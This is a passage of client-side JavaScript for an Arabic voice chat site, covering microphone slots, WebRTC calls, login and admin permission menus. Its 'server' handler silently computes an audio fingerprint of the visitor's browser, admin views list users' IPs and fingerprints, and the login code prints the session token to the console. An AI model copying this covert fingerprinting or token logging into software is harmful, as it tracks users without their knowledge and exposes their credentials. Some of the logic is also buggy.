                        if (contextMenuOptions.length == 1) {
                            upro(currentMicUser);
                        } else {
                            // إظهار قائمة الخيارات الإدارية (سحب، قفل، تفعيل)
                            openContextMenu(clickedMicBtn, contextMenuOptions, function (selectedOption) {
                                switch (selectedOption) {
                                    case "سحب المايك":
                                        send("uml", currentMicUser); // أمر سحب المايك uml المستخرج من الكلاسات
                                        break;
                                    case "قفل المايك":
                                        send("micstat", {
                                            'i': currentMicIdx,
                                            'v': false
                                        });
                                        break;
                                    case "تفعيل المايك":
                                        send("micstat", {
                                            'i': currentMicIdx,
                                            'v': true
                                        });
                                        break;
                                    case "عرض الملف":
                                        upro(currentMicUser);
                                        break;
                                }
                            });
                        }
                    }, 10);
                });
            }
        } else {
            // إذا كان المايك فارغاً (غير مشغول)
            micElement.find('.u').hide();
            micElement.css("background-image", "url(imgs/mic.png)");
            if (micUserId == 0) {
                micElement.css({
                    'background-color': "grey",
                    'outline': ''
                });
            } else {
                micElement.css({
                    'background-color': '',
                    'outline': ''
                });
            }
            micElement.find("img").removeAttr("src");
            micElement.find("span").text('');

            // عند النقر على مايك فارغ لأخذ المايك والتحدث
            micElement.off().click(function () {
                var clickedMicBtn = this;
                var currentMicIdx = parseInt($(this).attr('i'));
                var currentMicUser = mic[currentMicIdx];

                setTimeout(function () {
                    var contextMenuOptions = ["تحدث"];
                    if (currentMicUser == 0) {
                        contextMenuOptions = [];
                    }
                    if (userPermissionsConfig.mic || isRoomOperator) {
                        if (currentMicUser == 0) {
                            contextMenuOptions.push("تفعيل المايك");
                        } else {
                            contextMenuOptions.push("قفل المايك");
                        }
                    }
                    if (contextMenuOptions.length == 1 && currentMicUser != 0) {
                        tmic(currentMicIdx);
                    } else {
                        openContextMenu(clickedMicBtn, contextMenuOptions, function (selectedOption) {
                            switch (selectedOption) {
                                case "قفل المايك":
                                    send("micstat", {
                                        'i': currentMicIdx,
                                        'v': false
                                    });
                                    break;
                                case "تفعيل المايك":
                                    send("micstat", {
                                        'i': currentMicIdx,
                                        'v': true
                                    });
                                    break;
                                case "تحدث":
                                    tmic(currentMicIdx);
                                    break;
                            }
                        });
                    }
                }, 10);
            });
        }
    }
}

// دالة تحليل ومعالجة حجم وذبذبات الصوت الخارج من المايك
function analyzeAudioLevel(audioCtxInstance, streamSource, callback) {
    var scriptProcessor = audioCtxInstance.createScriptProcessor(0x800, 1, 1);
    scriptProcessor.connect(audioCtxInstance.destination);
    var mediaStreamSource = audioCtxInstance.createMediaStreamSource(streamSource);
    mediaStreamSource.connect(scriptProcessor);

    scriptProcessor.onaudioprocess = function (audioProcessingEvent) {
        var channelData = audioProcessingEvent.inputBuffer.getChannelData(0);
        var bufferLength = channelData.length;
        var totalAmplitude = i = 0;
        var rmsVolume;
        while (i < bufferLength) {
            totalAmplitude += Math.abs(channelData[i++]);
        }
        rmsVolume = Math.sqrt(totalAmplitude / bufferLength);
        callback(rmsVolume); // إرسال قيمة تذبذب الصوت لتحديث لمبة أو ذبذبة المايك بالواجهة
    };
}

// دالة تشغيل / إيقاف وطلب المايك الفعلي للإرسال إلى السيرفر
function tmic(micIndexParam) {
    if (isMutedAll || mic.indexOf(myid) != -1) {
        micIndexParam = -1;
    }
    if (micIndexParam > -1 && localAudioStream == null) {
        localAudioStream = {};
        requestMicrophonePermission({
            'video': false,
            'audio': true
        }, function (audioStream) {
            localAudioStream = audioStream;
            send("mic", micIndexParam); // إرسال طلب المايك للسيرفر باستخدام الدالة send
            if (audioContext != null) {
                audioContext.close();
            }
            audioContext = new AudioContextClass();
            analyzeAudioLevel(audioContext, audioStream, function (volume) {
                audioProcessor = volume;
            });
        }, function () {
            localAudioStream = null;
        });
    } else {
        send("mic", micIndexParam);
    }
}
// دالة النقر على الفيس أو الإيموجي وإدراجه بداخل صندوق النص .tbox
function pickedemo(emojiElement) {
    emojiElement = $(emojiElement);
    var emojiTitle = emojiElement.attr("title");
    var chatTextArea = emojiElement.parent().parent().parent().find(".tbox");
    // حقن الرمز البرمجي الخاص بالفيس (مثل ف1) بداخل الصندوق مع إرجاع التركيز (Focus)
    chatTextArea.val(chatTextArea.val() + " ف" + emojiTitle + " ").focus().val(chatTextArea.val());
}
var cachedEmojiBoxElement = null;

// دالة بناء وتوليد لوحة الإيموجيات المخصصة (emos) داخل صندوق الـ .emobox
function buildEmojiBoxPanel() {
    var emojiImagesHtml = '';
    for (var i = 0; i < chatEmojisList.length; i++) {
        emojiImagesHtml += "<img style=\"margin:2px;\" class=\"emoi\" src=\"emo/" + chatEmojisList[i] + "\" title=\"" + (i + 1) + "\" onclick=\"pickedemo(this);\">";
    }
    var emojiContainerNode = $("<div style='width:300px;background-color:#fafafa;' class='break'></div>");
    emojiContainerNode[0].innerHTML = emojiImagesHtml;
    cachedEmojiBoxElement = emojiContainerNode;
    $(".emobox").off().click(function () {
        $(this).blur();
        openPopupDialog(this, cachedEmojiBoxElement, false).css("max-height", "310px");
    });
}

// أحداث إغلاق المتصفح أو مغادرة الصفحة لتسجيل خروج العضو فوراً
window.onunload = function () {
    if (myid && chatPermissionsCookie == null) {
        send("logout", {});
    }
};

// إظهار نافذة تأكيد التنبيه للمستخدم عند محاولة إغلاق تبويب شات جافا سكريبت
var handleWindowBeforeUnload = function (event) {
    event = event || window.event;
    if (event) {
        event.returnValue = "هل تريد مغادره الدردشه؟";
    }
    return "هل تريد مغادره الدردشه? ";
};
var systemCommandQueue = [];
var isSystemQueueLocked = false;

// محرك إدارة نظام المكالمات الخاصة الصوتي (Call System) المرتبط باللوحة #call
function handlePrivateCallAction(targetUserId, actionType) {
    var targetUserObj = allUsersList[targetUserId];
    var callBoxWindow = $("#call");
    switch (actionType) {
        case "call":
            if (activeCallInstance != null) {
                handlePrivateCallAction(activeCallInstance.uid, "hangup");
            }
            if (targetUserId == myid || chatInteractionsConfig.calls != true) {
                return;
            }
            activeCallInstance = {};
            requestMicrophonePermission({
                'video': false,
                'audio': true
            }, function (audioStream) {
                if (debugMode) {
                    logDebug(["got Media"]);
                }
                activeCallInstance = new VoicePeerConnection(targetUserId, true, audioStream, true);
                callBoxWindow.find(".u-pic").css("background-image", "url('" + targetUserObj.pic + "')").parent().off().click(function () {
                    upro(targetUserId);
                    $("#upro").css("z-index", "2002");
                });
                callBoxWindow.find(".u-topic").css("color", targetUserObj.ucol).css("background-color", targetUserObj.bg || "#fafafa").html(targetUserObj.topic);
                callBoxWindow.find(".u-ico").attr('src', getUserIconPath(targetUserObj) || '');
                callBoxWindow.find(".btn-success").hide();
                callBoxWindow.find(".stat").text("يتم الاتصال ..");
                callBoxWindow.css({
                    'top': "55px",
                    'left': "5px"
                });
                callBoxWindow.show();
                activeCallInstance.c = callBoxWindow;
                activeCallInstance.uid = targetUserId;
                activeCallInstance.on("signal", function (signalData) {
                    if (activeCallInstance.ready == false) {
                        if (Array.isArray(signalData)) {
                            activeCallInstance.ls = activeCallInstance.ls.concat(signalData);
                        } else {
                            activeCallInstance.ls.push(signalData);
                        }
                    } else {
                        send("call", {
                            't': "signal",
                            'id': targetUserId,
                            'data': signalData
                        });
                    }
                });
                activeCallInstance.on("connect", function () {
                    callBoxWindow.find(".stat").text("متصل");
                });
                activeCallInstance.on("error", function (err) {
                    handlePrivateCallAction(targetUserId, "hangup");
                });
                callBoxWindow.find(".btn-danger").off().click(function () {
                    send("call", {
                        't': "call",
                        't': 'x',
                        'id': targetUserId
                    });
                    handlePrivateCallAction(targetUserId, "hangup");
                });
                send("call", {
                    't': "call",
                    'id': targetUserId
                });
            }, function (err) {
                if (debugMode) {
                    logDebug(["GM ERR", err, err.message, err.stack]);
                }
                activeCallInstance = null;
                handlePrivateCallAction(targetUserId, "hangup");
            });
            break;
        case "answer":
            if (activeCallInstance == null) {
                send("call", {
                    't': 'x',
                    'id': targetUserId
                });
                return;
            }
            activeCallInstance.ready = true;
            callBoxWindow.find(".stat").text('..');
            send('call', {
                't': "signal",
                'id': targetUserId,
                'data': activeCallInstance.ls
            });
            activeCallInstance.ls = [];
        case "calling":
            if (chatInteractionsConfig.calls != true) {
                return;
            }
            if (isUserIgnoredInList(allUsersList[targetUserId])) {
                send("call", {
                    't': "call",
                    't': 'x',
                    'id': targetUserId
                });
                return;
            }
            if (false && $('#c' + targetUserId).length == 0) {
                send("nopm", {
                    'id': targetUserId
                });
                send("call", {
                    't': "call",
                    't': 'x',
                    'id': targetUserId
                });
                return;
            }
            openw(targetUserId, false);
            var privateMessageArea = $('.w' + targetUserId).find(".d2");
            privateMessageArea.find(".call .btn").remove();
            var callUiNotificationNode = $("<div class='border mm call' style='width:100%;padding:2px;'><span style='padding:4px 18px;margin-right:2px;' class='fa fa-phone btn btn-success'>قبول</span><span style='padding:4px 18px;margin-right:2px;' class='fa fa-phone btn btn-danger'>رفض</span><span class='txt'>يتصل بك</span></div>");
            privateMessageArea.append(callUiNotificationNode);
            privateMessageArea.scrollTop(privateMessageArea[0].scrollHeight);
            callUiNotificationNode.find(".btn-danger").off().click(function () {
                $(this).parent().remove();
                send("call", {
                    't': "call",
                    't': 'x',
                    'id': targetUserId
                });
                callBoxWindow.css({
                    'display': "none"
                });
            });
            callUiNotificationNode.find(".btn-success").off().click(function () {
                $(this).parent().remove();
                if (activeCallInstance != null) {
                    handlePrivateCallAction(activeCallInstance.uid, "hangup");
                }
                activeCallInstance = {};
                requestMicrophonePermission({
                    'video': false,
                    'audio': true
                }, function (audioStream) {
                    callBoxWindow.find(".u-pic").css("background-image", "url('" + targetUserObj.pic + "')").parent().off().click(function () {
                        upro(targetUserId);
                        $("#upro").css("z-index", "2002");
                    });
                    callBoxWindow.find(".u-topic").css("color", targetUserObj.ucol).css("background-color", targetUserObj.bg || "#fafafa").html(targetUserObj.topic);
                    callBoxWindow.find(".u-ico").attr("src", getUserIconPath(targetUserObj) || '');
                    callBoxWindow.find(".btn-success").hide();
                    callBoxWindow.find(".stat").text("يتم الاتصال ..");
                    callBoxWindow.css({
                        'top': "55px",
                        'left': '5px'
                    });
                    callBoxWindow.show();
                    callBoxWindow.find(".btn-danger").off().click(function () {
                        send("call", {
                            't': "call",
                            't': 'x',
                            'id': targetUserId
                        });
                        handlePrivateCallAction(targetUserId, "hangup");
                    });
                    activeCallInstance = new VoicePeerConnection(targetUserId, false, audioStream, true);
                    activeCallInstance.c = callBoxWindow;
                    activeCallInstance.uid = targetUserId;
                    activeCallInstance.ready = true;
                    activeCallInstance.on("error", function (error) {
                        handlePrivateCallAction(targetUserId, "hangup");
                    });
                    activeCallInstance.on("signal", function (signalData) {
                        send("call", {
                            't': "signal",
                            'id': targetUserId,
                            'data': signalData
                        });
                    });
                    activeCallInstance.on("connect", function () {
                        callBoxWindow.find(".stat").text("متصل");
                    });
                    send("call", {
                        't': "call",
                        't': "answer",
                        'id': targetUserId
                    });
                }, function (error) {
                    activeCallInstance = null;
                    handlePrivateCallAction(targetUserId, "hangup");
                });
            });
            break;
        case "hangup":
            var privateMessageArea = $('.w' + targetUserId).find(".d2");
            privateMessageArea.find(".call").remove();
            if (activeCallInstance != null && activeCallInstance.uid == targetUserId) {
                callBoxWindow.css({
                    'display': "none"
                });
                send("call", {
                    't': "call",
                    't': 'x',
                    'id': targetUserId
                });
                activeCallInstance.on = null;
                activeCallInstance.destroy(true);
                activeCallInstance = null;
            }
            break;
    }
}
// تم الفحص الى هنا
// دالة تفكيك ومعالجة مصفوفة أوامر السيرفر القادمة وحقن الأفعال بالواجهة أو لوحة التحكم
function executeControlPanelAction(commandName, commandPayload) {
    var sessionIdContext;
    if (commandPayload != null && commandPayload.cpi) {
        sessionIdContext = commandPayload.cpi;
        commandPayload = commandPayload.data;
    }
    if (isSystemQueueLocked && commandName != 'rc' && commandName != "rcd" && commandName != "close") {
        systemCommandQueue.push([commandName, commandPayload]);
        return;
    }
    try {
        if (chatPermissionsCookie == null) {
            if (sessionIdContext) {
                var linkedWindow = activeWindowsList[sessionIdContext];
                if (linkedWindow) {
                    linkedWindow.postMessage([commandName, commandPayload]);
                    return;
                }
            } else {
                // تمرير أوامر لوحة التحكم cp_ إلى النوافذ التابعة المفتوحة
                if (userPermissionsConfig[commandName] || commandName.indexOf('cp_') == 0) {
                    for (var windowId in activeWindowsList) {
                        var linkedWindow = activeWindowsList[windowId];
                        linkedWindow.postMessage([commandName, commandPayload]);
                    }
                }
            }
        }
        switch (commandName) {
            // 1. معالجة بيانات المايك العام والغرفة (p2) وتقنية WebRTC
            case 'p2':
                if (typeof SimplePeer == "undefined") {
                    setTimeout(function () {
                        executeControlPanelAction(commandName, commandPayload);
                    }, 0x7d0);
                    return;
                }
                var targetUserObj = allUsersList[commandPayload.id];
                if (targetUserObj == null) {
                    return;
                }
                var peerConnectionInstance = peerConnections[commandPayload.dir != 1 ? '_' + commandPayload.id : commandPayload.id];
                switch (commandPayload.t) {
                    case "start":
                        if (peerConnectionInstance != null) {
                            peerConnectionInstance.on = null;
                            peerConnectionInstance.destroy();
                        }
                        peerConnectionInstance = new VoicePeerConnection(commandPayload.id, false, null);
                        peerConnections[commandPayload.id] = peerConnectionInstance;
                        peerConnectionInstance.uid = commandPayload.id;
                        peerConnectionInstance.on("error", function (err) {
                            peerConnectionInstance.destroy();
                            delete peerConnections[commandPayload.id];
                            send('p2', {
                                't': 'x',
                                'id': commandPayload.id
                            });
                            setTimeout(function () {
                                if (peerConnections[commandPayload.id] == null) {
                                    send('p2', {
                                        't': "signal",
                                        'data': "repeer",
                                        'id': commandPayload.id
                                    });
                                }
                            }, 0x5dc);
                        });
                        peerConnectionInstance.on("signal", function (signalData) {
                            send('p2', {
                                't': "signal",
                                'id': commandPayload.id,
                                'data': signalData
                            });
                        });
                        break;
                    case "signal":
                        if (commandPayload.data == "repeer") {
                            connectVoiceToUser(targetUserObj);
                            return;
                        }
                        if (peerConnectionInstance != null) {
                            var signalDataArray = Array.isArray(commandPayload.data) ? commandPayload.data : [commandPayload.data];
                            for (var i = 0; i < signalDataArray.length; i++) {
                                peerConnectionInstance.peer.signal(signalDataArray[i]);
                            }
                        }
                        break;
                    case 'x':
                        if (peerConnectionInstance != null) {
                            peerConnectionInstance.destroy(false);
                            delete peerConnections[commandPayload.dir != 1 ? '_' + commandPayload.id : commandPayload.id];
                        }
                        break;
                }
                break;

                // 2. معالجة إشارات المكالمات الخاصة (call) المربوطة بـ #call
            case 'call':
                var targetUserObj = allUsersList[commandPayload.id];
                if (targetUserObj == null) {
                    return;
                }
                switch (commandPayload.t) {
                    case "call":
                        handlePrivateCallAction(commandPayload.id, "calling");
                        break;
                    case "reject":
                        handlePrivateCallAction(commandPayload.id, "reject");
                        break;
                    case "answer":
                        handlePrivateCallAction(commandPayload.id, "answer");
                        break;
                    case "signal":
                        if (activeCallInstance != null && activeCallInstance.uid == commandPayload.id) {
                            var signalDataArray = Array.isArray(commandPayload.data) ? commandPayload.data : [commandPayload.data];
                            for (var i = 0; i < signalDataArray.length; i++) {
                                activeCallInstance.peer.signal(signalDataArray[i]);
                                if (signalDataArray[i].type == "offer") {
                                    $("#call").find(".stat").text('..');
                                }
                            }
                        }
                        break;
                    case 'x':
                        handlePrivateCallAction(commandPayload.id, "hangup");
                        break;
                }
                break;

                // 3. معالجة أمر كشف السجل والنكات وعنوان الآيبي وبصمة المتصفح الإدارية (uh)
            case 'uh':
                var tableNode = buildTableHtmlElement("العضو,الزخرفه,IP,الوقت,#".split(','));
                tableNode.css("min-width", "100%").css("background-color", "#fefefe");
                openAdminPopupDialog("كشف النكات", tableNode);
                var tableRowsHtml = '';
                for (var i = commandPayload.length - 1; i != -1; i--) {
                    var logItem = commandPayload[i];
                    var searchFpBtnHtml = "<a class=\"btn btn-primary fa fa-search\" onclick=\"$('.popx').remove();cp_fps_do('" + logItem._fp.replace(/"/g, '').replace(/'/g, '') + "');\"></a>";
                    tableRowsHtml += buildTableRowHtml([logItem.u, logItem.t, logItem._ip, new Date(new Date().getTime() - logItem.c).getTime().time(), userPermissionsConfig.cp ? searchFpBtnHtml : ''], [80, 120, 80, 80, 0x28]);
                    tableRowsHtml += "<td colspan=5 style=\"max-width:120px;\" class=\"break\">" + logItem._fp.replace(/"/g, '').replace(/'/g, '').replace(/\</g, '') + "</td></tr>";
                }
                tableNode.find("tbody").html(tableRowsHtml);
                break;
            case "settings":
                chatInteractionsConfig = commandPayload;
                if (chatInteractionsConfig.calls == true) {
                    $(".callx").show();
                } else {
                    $(".callx").hide();
                }
                break;
            case "server":
                isStreamActive = true;
                $("#s1").removeClass("label-warning").addClass("label-success").text(commandPayload.online);
                navigator.n = navigator.n || {};
                var performanceStartTime = performance.now();
                (function () {
                    var offlineAudioCtx = null;
                    var currentTimeMark = null;
                    var oscillatorNode = null;
                    var dynamicsCompressorNode = null;
                    var resultFingerprint = null;
                    var callbackFunction = null;

                    function generateAudioFingerprint(callback, throwOnError = false) {
                        callbackFunction = callback;
                        try {
                            initializeOfflineContext();
                            oscillatorNode.connect(dynamicsCompressorNode);
                            dynamicsCompressorNode.connect(offlineAudioCtx.destination);
                            oscillatorNode.start(0);
                            offlineAudioCtx.startRendering();
                            offlineAudioCtx.oncomplete = processRenderedAudio;
                        } catch (error) {
                            if (throwOnError) {
                                throw error;
                            }
                        }
                    }

                    function initializeOfflineContext() {
                        setupContextInstance();
                        currentTimeMark = offlineAudioCtx.currentTime;
                        buildOscillator();
                        buildCompressor();
                    }

                    function setupContextInstance() {
                        var OfflineAudioContextClass = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                        offlineAudioCtx = new OfflineAudioContextClass(1, 0xac44, 0xac44);
                    }

                    function buildOscillator() {
                        oscillatorNode = offlineAudioCtx.createOscillator();
                        oscillatorNode.type = "triangle";
                        oscillatorNode.frequency.setValueAtTime(0x2710, currentTimeMark);
                    }

                    function buildCompressor() {
                        dynamicsCompressorNode = offlineAudioCtx.createDynamicsCompressor();
                        setCompressorParameter("threshold", -0x32);
                        setCompressorParameter('knee', 0x28);
                        setCompressorParameter("ratio", 0xc);
                        setCompressorParameter("reduction", -0x14);
                        setCompressorParameter("attack", 0);
                        setCompressorParameter("release", 0.25);
                    }

                    function setCompressorParameter(parameterName, parameterValue) {
                        if (dynamicsCompressorNode[parameterName] !== undefined && typeof dynamicsCompressorNode[parameterName].setValueAtTime === "function") {
                            dynamicsCompressorNode[parameterName].setValueAtTime(parameterValue, offlineAudioCtx.currentTime);
                        }
                    }

                    function processRenderedAudio(audioEvent) {
                        extractBufferData(audioEvent);
                        dynamicsCompressorNode.disconnect();
                    }

                    function extractBufferData(audioBufferEvent) {
                        var totalAmplitudeSum = null;
                        for (var i = 0x1194; 0x1388 > i; i++) {
                            var channelSample = audioBufferEvent.renderedBuffer.getChannelData(0)[i];
                            totalAmplitudeSum += Math.abs(channelSample);
                        }
                        resultFingerprint = totalAmplitudeSum.toString();
                        if (typeof callbackFunction === "function") {
                            return callbackFunction(resultFingerprint);
                        }
                    }
                    return {
                        'run': generateAudioFingerprint
                    };
                })().run(function (calculatedHash) {
                    performanceStartTime = performance.now() - performanceStartTime;
                    navigator.n.a = calculatedHash;
                });
                break;
            case "online":
                updateOnlineUsersList(commandPayload, 0);
                break;
            case "online+":
                updateOnlineUsersList(commandPayload, 1);
                break;
            case "online-":
                updateOnlineUsersList(commandPayload, -1);
                break;
            case 'dro3':
                groupIcons = commandPayload;
                break;
            case "sico":
                activeBansList = commandPayload;
                break;
            case "emos":
                chatEmojisList = commandPayload;
                selectedEmojiObject = {};
                for (var i = 0; i < chatEmojisList.length; i++) {
                    selectedEmojiObject['ف' + (i + 1)] = chatEmojisList[i];
                }
                setTimeout(function () {
                    buildEmojiBoxPanel();
                }, 0x3e8);
                break;
            case 'ok':
                $(".ovr div").attr("class", "label-success").find("div").text("متصل ..");
                reconnectionAttempts = 0;
                setTimeout(function () {
                    $(".ovr").remove();
                }, 0x5dc);
                isReconnecting = false;
                break;
            case 'rc':
                isSystemQueueLocked = true;
                systemCommandQueue = [];
                break;
            case 'rcd':
                isSystemQueueLocked = false;
                systemCommandQueue = [];
                var combinedQueueData = commandPayload.concat(systemCommandQueue);
                for (var i = 0; i < combinedQueueData.length; i++) {
                    executeControlPanelAction(combinedQueueData[i][0], combinedQueueData[i][1]);
                }
                break;
            case 'mv':
                var micUserIndex = mic.indexOf(commandPayload[0]);
                if (micUserIndex != -1) {
                    commandPayload[1] = Math.min(1, commandPayload[1] * 1.4);
                    $("#mic" + micUserIndex).css("outline", "2px solid rgba(111, 200, 111, " + Math.max(0, Math.ceil(commandPayload[1] * (commandPayload[1] < 0.05 ? 0 : 100) / 5) * 5 * 0.0255) + ')');
                }
                break;
            case "login":
                // تحميل كافة صور الشات تدريجياً وبشكل آمن عبر وسم dsrc الكسول لتسريع المتصفح
                $("img").each(function (index, imgElement) {
                    if ($(imgElement).attr("dsrc") != '') {
                        $(imgElement).attr("src", $(imgElement).attr("dsrc"));
                        $(imgElement).removeAttr("dsrc");
                    }
                });
                // إلغاء قفل زر الإدخال لمنع التجميد في لوحة تسجيل الدخول tlogins
                $("#tlogins button").removeAttr("disabled");

                switch (commandPayload.msg) {
                    case 'ok':
                        usea = $("#usearch"); // حقل البحث عن المستخدمين usearch
                        if (!chatPermissionsCookie) {
                            // بدء مؤقت مراقبة حقل إدخال النك نيم وتأثيرات الخلفية التنبيهية
                            setInterval(checkInput, 0x258);
                        }
                        cachedUserHtmlTemplate = $("#uhtml").html(); // قالب تصميم العضو uzr الافتراضي
                        cachedRoomHtmlTemplate = $("#rhtml").html(); // قالب تصميم الغرفة room الافتراضي
                        var lastTypingStateKey = null;

                        // مؤقت دوري سريع جداً (كل 200 ملي ثانية) لمراقبة تذبذبات المايك وإرسال جاري الكتابة "ty"
                        setInterval(() => {
                            try {
                                // أولاً: فحص حقل النص وإرسال إشارة "يكتب الآن..." (Typing Indicator) في الخاص أو العام
                                if (myid != null && isReconnecting == false && activeChatTabWindow != null && currentPrivateUser != null) {
                                    var visibleTextArea = $(activeChatTabWindow).find(".tbox:visible");
                                    var currentTextLength = visibleTextArea.length > 0 ? visibleTextArea.val().length : 0;

                                    // إذا كان المستخدم يكتب نصاً حالياً ولم يتم إرسال إشارة "يكتب حالياً" بعد
                                    if (visibleTextArea.length > 0 && currentTextLength > 0 && typingStateTracker != 1) {
                                        typingStateTracker = 1;
                                        if (lastTypingStateKey != currentPrivateUser + '_' + 1) {
                                            lastTypingStateKey = currentPrivateUser + '_' + 1;
                                            send('ty', [currentPrivateUser, 1]); // إرسال إشارة البدء بالكتابة ty للسيرفر
                                        }
                                    } else {
                                        // إذا مسح المستخدم النص أو توقف تماماً عن الكتابة
                                        if (currentTextLength == 0 && typingStateTracker != 0) {
                                            typingStateTracker = 0;
                                            if (lastTypingStateKey != currentPrivateUser + '_' + 0) {
                                                lastTypingStateKey = currentPrivateUser + '_' + 0;
                                                send('ty', [currentPrivateUser, 0]); // إرسال إشارة التوقف عن الكتابة للسيرفر
                                            }
                                        }
                                    }
                                }

                                // ثانياً: تحديث تذبذبات وعدادات ذبذبة الصوت للمايكات الخمسة المفتوحة دورياً
                                for (var i = 0; i < mic.length; i++) {
                                    if (typeof mic[i] == "string") {
                                        var peerConnection = peerConnections[mic[i]];
                                        if (peerConnection != null) {
                                            executeControlPanelAction('mv', [peerConnection.uid, peerConnection.alvl]);
                                        } else {
                                            if (mic[i] == myid) {
                                                executeControlPanelAction('mv', [myid, audioProcessor]); // ذبذبة المايك الخاص بك
                                            }
                                        }
                                    }
                                }
                            } catch (e) {}
                        }, 0xc8);

                        dpnl = $("#dpnl"); // لوحة الشات المنبثقة الجانبية (dpnl)
                        var currentSidebarWidth = 0;
                        body = $("body");

                        // إعادة موازنة واحتساب أبعاد اللوحة الجانبية dpnl ديناميكياً عند تغيير حجم نافذة المتصفح
                        $(window).on("resize", function () {
                            shouldScrollDownForce = true;
                            var calculatedWidth = Math.min(0x154, body.width() - 0x68) + 'px';
                            if (calculatedWidth != currentSidebarWidth) {
                                currentSidebarWidth = calculatedWidth;
                                dpnl[0].style.width = calculatedWidth;
                            }
                        });

                        if (isIosDevice) {
                            setupIosInputFixes(); // تشغيل إصلاحات كيبورد الآيفون والآيباد
                        }

                        // إخفاء صناديق التنبيهات mnot وصناعة الغرف mkr والملف الشخصي upro عند نجاح الدخول
                        $("#mnot,#mkr,#upro").css("display", "none");
                        if (!chatPermissionsCookie) {
                            runAutoScrollTimer(); // تفعيل تايمر التمرير التلقائي لأسفل المحادثة d2
                        }

                        // ضبط مرونة وستايل الكلاسات الصندوقية للواجهة المرنة flex
                        $(".d-flex,.c-flex").css("flex", "0 1 auto");
                        $(".tablebox").css("flex", "0 0 auto");
                        $("#dpnl,#cp").css("position", "fixed");

                        myid = commandPayload.id; // حفظ معرف الآي دي الخاص بك
                        $("#settings .cp").attr("href", "cp?cp=" + myid); // ربط رابط لوحة التحكم cp بالآي دي
                        userAuthHash = commandPayload.ttoken;
                        console.log(userAuthHash);

                        setv("token", userAuthHash); // حفظ توكين الجلسة المشفر في الـ LocalStorage
                        window.onbeforeunload = handleWindowBeforeUnload; // تفعيل تنبيه مغادرة الصفحة

                        $(".dad").remove(); // إزالة واجهة شاشة التحميل الابتدائية dad
                        $("#d2,.footer,#d0").show(); // عرض صندوق المحادثة الرئيسي d2 والشريط السفلي

                        // إغلاق القائمة المنبثقة الجانبية تلقائياً عند النقر داخل مربع الرسائل d2
                        $("#d2,#room .tablebox").click(function () {
                            $("#dpnl .fa-close").click();
                        });

                        $("#room").css("display", '');
                        $("#d2bc,#d2").css({
                            'display': "block",
                            'width': '100%'
                        });

                        // إعطاء التصميم النهائي وتحديد موضع ومقاسات شاشة العرض والأجهزة
                        $("#dpnl").addClass("c-flex").css({
                            'bottom': "36px",
                            'width': $(document.body).width() - 0x68 + 'px'
                        });
                        $("#mkr .rpic").css({
                            'width': "84px",
                            'height': '84px',
                            'position': "absolute",
                            'right': "4px",
                            'top': "6px"
                        });

                        fixSize(1);
                        break;

                        // رسائل وتنبيهات أخطاء واجهة تسجيل الدخول الموجهة للمستخدم  
                    case "noname":
                        showNotificationToast("warning", "هذا الإسم غير مسجل !");
                        break;
                    case "badname":
                        showNotificationToast("warning", "يرجى إختيار أسم آخر");
                        break;
                    case "usedname":
                        showNotificationToast("danger", "هذا الإسم مسجل من قبل");
                        break;
                    case "badpass":
                        showNotificationToast("warning", "كلمه المرور غير مناسبه");
                    case "wrong":
                        showNotificationToast("danger", "كلمه المرور غير صحيحه");
                        break;
                    case 'reg':
                        showNotificationToast("success", "تم تسجيل العضويه بنجاح !");
                        $('#u2').val($("#u3").val());
                        $("#pass1").val($("#pass2").val());
                        login(2); // التحويل التلقائي لتبويب تسجيل الدخول بعد نجاح التسجيل reg
                        break;
                }
                break;
            case "powers":
                activeAlerts = commandPayload;
                for (var i = 0; i < activeAlerts.length; i++) {
                    var powerName = activeAlerts[i].name;
                    if (powerName == '') {
                        powerName = '_';
                    }
                    activeAlerts[powerName] = activeAlerts[i];
                }
                var currentUserObj = allUsersList[myid];
                if (currentUserObj != null) {
                    userPermissionsConfig = parseUserPowerString(currentUserObj.power || '');
                    updatePermissionsUi();

                    // إظهار أو إخفاء زر إرسال الرسائل العامة بناءً على الرتبة
                    if (userPermissionsConfig.publicmsg > 0) {
                        $(".pmsg").show();
                    } else {
                        $(".pmsg").hide();
                    }

                    // فحص صلاحية دخول لوحة الإدارة cp وتصفية الأزرار التي تظهر لك
                    if (userPermissionsConfig.cp) {
                        $("#cp li").hide().find("a[href='#fps'],a[href='#actions'],a[href='#cp_rooms'],a[href='#logins']").parent().show();
                        if (userPermissionsConfig.ban) {
                            $("#cp li").find("a[href='#bans'],a[href='#actions'],a[href='#cp_rooms']").parent().show();
                        }
                        if (userPermissionsConfig.setpower) {
                            $("#cp li").find("a[href='#powers'],a[href='#subs']").parent().show();
                        }
                        if (userPermissionsConfig.owner) {
                            $("#cp li").show(); // مالك الموقع يرى جميع أزرار لوحة الإدارة بالكامل
                        }
                    }

                    var currentRoomObj = rcach[myroom];
                    // إظهار زر تعديل الغرفة redit إذا كنت مالكها الأصلي أو تملك صلاحية روم أونر العامة
                    if (currentRoomObj != null && currentUserObj != null && (currentRoomObj.owner == currentUserObj.lid || userPermissionsConfig.roomowner == true)) {
                        $(".redit").show();
                    } else {
                        $(".redit").hide();
                    }
                    cp_powers();
                }

                // تحديث قائمة المتواجدين بناءً على تحديث الصلاحيات
                for (var i = 0; i < ignoredUsersList.length; i++) {
                    var logItem = ignoredUsersList[i];
                    updateUserRowInUi(logItem.id, logItem);
                }
                shouldRefreshUsersList = true;
                break;

            case 'rops':
                // تحديث مصفوفة كادر الإشراف الحالي (Operators) للغرفة لتنفيذ عمليات المايك
                var currentRoomObj = rcach[allUsersList[myid].roomid];
                currentRoomObj.ops = [];
                $.each(commandPayload, function (index, opData) {
                    currentRoomObj.ops.push(opData.lid);
                });
                // إذا كنت من ضمن طاقم المشرفين الحالي بالروم، يتم تحديث واجهة المايكات فوراً
                if (commandPayload.indexOf(myid) != -1) {
                    updateRoomMicsStatus();
                }
                break;

            case "power":
                // معالجة تحديث رتبتك الحالية في نفس الوقت دون الحاجة لإعادة تسجيل الدخول
                var hasExistingPermissions = Object.keys(userPermissionsConfig).length != 0;
                userPermissionsConfig = commandPayload;
                updatePermissionsUi();

                if (userPermissionsConfig.cp) {
                    $("#cp li").hide().find("a[href='#fps'],a[href='#actions'],a[href='#cp_rooms'],a[href='#logins']").parent().show();
                    if (userPermissionsConfig.ban) {
                        $("#cp li").find("a[href='#bans'],a[href='#actions'],a[href='#cp_rooms']").parent().show();
                    }
                    if (userPermissionsConfig.setpower) {
                        $("#cp li").find("a[href='#powers'],a[href='#subs']").parent().show();
                    }
                    if (userPermissionsConfig.owner) {
                        $("#cp li").show();
